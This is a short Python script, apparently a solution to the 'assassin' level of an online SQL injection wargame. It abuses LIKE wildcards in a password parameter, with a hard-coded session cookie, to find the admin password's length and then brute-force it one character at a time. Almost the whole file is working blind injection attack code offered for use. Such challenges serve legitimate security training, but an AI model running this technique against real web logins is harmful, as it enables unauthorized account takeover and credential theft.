#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

urlHome ="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
p = "?pw="
c = "crlasl85b7068jsll6p1cliam9" #세션값
wc = "_"
length = 0
pw = ""
pwTmp = ""

while True:
  data = p + wc
  r = requests.post(urlHome + data, cookies=(dict(PHPSESSID=c)))
  
  if 'Hello admin' in r.text:
    length = wc.count('_')
    break
  elif 'Hello guest' in r.text:
    length = wc.count('_')
  
  wc += '_'
  if wc.count('_') == 20:
    break

print("length : ", length)

for i in range(1, length + 1):
  for j in range(48, 128):
    if j == 95: continue # "_" 제외
    data = "?pw=" + pw + chr(j) + "%"
    r = requests.post(urlHome + data, cookies=(dict(PHPSESSID=c)))

    if 'Hello admin' in r.text:
      pw += chr(j)
      print("admin pw : " + pw)
      break
    elif 'Hello guest' in r.text:
      pwTmp = chr(j)
    if j == 127:
      pw += pwTmp
      print("guest pw : " + pw)

print("pw : " + pw)